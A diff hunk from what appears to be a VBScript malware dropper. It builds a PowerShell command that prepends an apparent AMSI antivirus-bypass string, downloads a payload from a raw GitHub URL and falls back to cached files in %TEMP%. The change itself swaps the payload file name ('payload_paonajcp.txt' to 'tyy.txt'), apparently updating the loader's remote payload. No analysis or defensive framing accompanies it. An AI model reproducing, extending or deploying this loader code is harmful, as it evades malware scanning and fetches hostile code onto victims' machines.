@@ -571,7 +571,7 @@ amsi = "$c='using System;using System.Runtime.InteropServices;public class P{[Dl
 
 Dim ps, finalCmd
 ps = "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=3072;" & amsi & _
-     "$u='https://raw.githubusercontent.com/lumen771/fff/refs/heads/main/payload_paonajcp.txt';" & _
+     "$u='https://raw.githubusercontent.com/lumen771/fff/refs/heads/main/tyy.txt';" & _
      "$b='';try{$b=(iwr -Uri $u -UseBasicParsing -TimeoutSec 20).Content}catch{};" & _
      "if(!$b){$t1='%TEMP%\a.txt';if(Test-Path $t1){$b=gc $t1 -Raw}};" & _
      "if(!$b){$t2='%TEMP%\b.txt';if(Test-Path $t2){$b=gc $t2 -Raw}};" & _
